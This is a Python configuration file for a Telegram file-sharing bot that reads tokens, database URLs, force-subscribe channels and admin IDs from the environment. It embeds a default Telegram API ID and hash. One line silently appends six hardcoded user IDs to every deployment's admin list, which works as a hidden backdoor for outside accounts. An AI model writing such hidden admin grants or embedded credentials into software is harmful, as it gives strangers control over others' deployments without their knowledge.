# (©)Codexbotz
# Recode by @mrismanaziz
# t.me/SharingUserbot & t.me/Lunatic0de

import logging
import os
from distutils.util import strtobool
from dotenv import load_dotenv
from logging.handlers import RotatingFileHandler

load_dotenv("config.env")

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")

APP_ID = int(os.environ.get("APP_ID", "28653571"))

API_HASH = os.environ.get("API_HASH", "eca35c0338b15aa33cc2d5df4a5a7b65")

CHANNEL_DB = int(os.environ.get("CHANNEL_DB", ""))
OWNER = os.environ.get("OWNER", "excute7")
PROTECT_CONTENT = strtobool(os.environ.get("PROTECT_CONTENT", "True"))

HEROKU_APP_NAME = os.environ.get("HEROKU_APP_NAME", None)
HEROKU_API_KEY = os.environ.get("HEROKU_API_KEY", None)

UPSTREAM_BRANCH = os.environ.get("UPSTREAM_BRANCH", "master")

# Database type
DATABASE_TYPE = os.getenv("DATABASE_TYPE", "")

# Database SQL
DB_URI = os.getenv("DB_URL", "")

# Database MongoDB
MONGO_NAME = os.getenv("MONGO_NAME", "")
MONGO_URL = os.getenv("MONGO_URL", "")


FORCE_SUB_ = {}
FSUB_TOTAL = 1
while True:
    key = f"FORCE_SUB_{FSUB_TOTAL}"
    value = os.getenv(key)
    if value is None:
        break
    FORCE_SUB_[FSUB_TOTAL] = int(value)
    FSUB_TOTAL += 1

BUTTON_ROW = int(os.getenv("BUTTON_ROW", 3))

BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
)
try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>Hello {first}\n\nAnda harus bergabung di Channel/Grup saya Terlebih dahulu untuk Melihat File yang saya Bagikan\n\nSilakan Join Ke Channel & Group Terlebih Dahulu</b>",
)


CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)


DISABLE_CHANNEL_BUTTON = strtobool(os.environ.get("DISABLE_CHANNEL_BUTTON", "False"))

ADMINS.extend((844432220, 1250450587, 1750080384, 182990552, 903187853, 5050907047))


LOG_FILE_NAME = "logs.txt"
logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
